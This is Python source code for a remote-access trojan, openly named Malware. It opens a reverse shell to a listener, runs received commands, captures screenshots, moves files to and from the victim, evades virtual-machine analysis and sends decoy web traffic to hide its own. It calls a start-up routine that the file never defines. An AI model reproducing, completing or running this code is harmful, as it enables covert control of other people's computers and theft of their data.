import socket
import os 
import subprocess 
import requests 
import time
import platform
import pyautogui
import uuid
import threading
import os
import sys
class Malware():
    def __init__(self , lhost , lport , timer):
        self.i = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.lhost = lhost
        self.lport = lport
        self.timer = timer
        self.hostname = socket.gethostname()
        self.username = os.getlogin()
        self.filename = sys.argv[0]
        self.filename = os.path.basename(self.filename)
        self.info = f"""
-----------------
      INFO
-----------------
hostname => {self.hostname}
username => {self.username}
os => {platform.system()}
release => {platform.release()}
version => {platform.version()}
Arch => {platform.architecture()[0]}
python version => {platform.python_version()}
filename => {self.filename}
"""
        self.links = [r'https://www.google.com',
r'https://www.youtube.com',
r'https://www.facebook.com',
r'https://www.amazon.com',
r'https://www.wikipedia.org',
r'https://www.reddit.com',
r'https://www.twitter.com',
r'https://www.instagram.com',
r'https://www.linkedin.com',
r'https://www.netflix.com']
        self.vm_process =["vmware-vmx.exe",
"vmware.exe",
"vmware-authd.exe",
"vmware-tray.exe",
"VirtualBox.exe",
"VBoxSVC.exe",
"VBoxHeadless.exe",
"VBoxTray.exe",
"VBoxManage.exe",
]
    def connect_server(self):
        while True:
            try:
                self.i.connect((self.lhost, self.lport))
                self.interact_server()
            except:
                time.sleep(self.timer)
    def anti_vm(self):
        all_process = os.popen('tasklist').read()
        for vm_process in self.vm_process:
            if vm_process in all_process:
                print(vm_process)
                print(f'Virtual Machine Process Found :{vm_process}')
                self.kill()
        self.start_up()
        th1 = threading.Thread(target=self.fake_requests)
        th2 = threading.Thread(target=self.connect_server)
        th2.start()
        th1.start()
        
    def kill(self):
        exit()      
    
    def fake_requests(self):
        while True:
            for link in self.links:
                r = requests.get(link)
    
    def interact_server(self):
        self.i.sendall(self.hostname.encode())
        while True:
            command = self.i.recv(1024).decode()
            if command == 'info':
                self.i.sendall(self.info.encode())
            elif command == 'shell':
                while True:
                    command = self.i.recv(1024).decode()
                    if command.lower() == 'exit':
                        break
                    elif command.startswith('cd'):
                        try:
                            data = command.split()
                            dirw = data[1]
                            os.chdir(dirw)
                            self.i.sendall('<end>'.encode())
                        except:
                            output = subprocess.getoutput(command)
                            self.i.sendall(output.encode())
                            self.i.sendall('<end>'.encode())
                    else:
                        output = subprocess.getoutput(command)
                        if len(output) > 0 and output != None:
                            self.i.sendall(output.encode())
                            self.i.sendall('<end>'.encode())
                        else:
                            self.i.sendall('<end>'.encode())
            elif command == 'screenshot':
                uid = uuid.uuid4()
                screenshot = pyautogui.screenshot()
                screenshot.save(f'{uid}.jpg')
                with open(f'{uid}.jpg' , 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if len(data) > 0:
                            self.i.sendall(data)
                        else:
                            self.i.sendall('<end>'.encode())
                            break
                    os.remove(f'{uid}.jpg')
                    file.close()
            elif command.startswith('download'):
                try:
                    data = command.split()
                    filename = data[1]
                    with open(filename , 'rb') as file:
                        self.i.sendall('work'.encode())
                        time.sleep(0.7)
                        while True:
                            data = file.read(1024)
                            if len(data) > 0:
                                self.i.sendall(data)
                            else:
                                self.i.sendall("<end>".encode())
                                break
                except FileNotFoundError:
                    self.i.sendall('error:file_not_found'.encode())
                except PermissionError:
                    self.i.sendall('error:admin'.encode())     
            elif command.startswith('upload'):
                try:
                    data = command.split()
                    filename = data[1]
                    with open(filename , 'wb') as file:
                        self.i.sendall('work'.encode())
                        while True:
                            data = self.i.recv(1024)
                            print(data.decode())
                            if data[-5:] == b'<end>' or data == b'<end>':
                                if data[-5:] == b'<end>':
                                    file.write(data[:-5])
                                    break
                                else:
                                    break
                            else:
                                file.write(data)
                    file.close()
                except PermissionError:
                    self.i.sendall('error:admin'.encode())
                    
    
malware = Malware('localhost',4444,0)
malware.anti_vm()
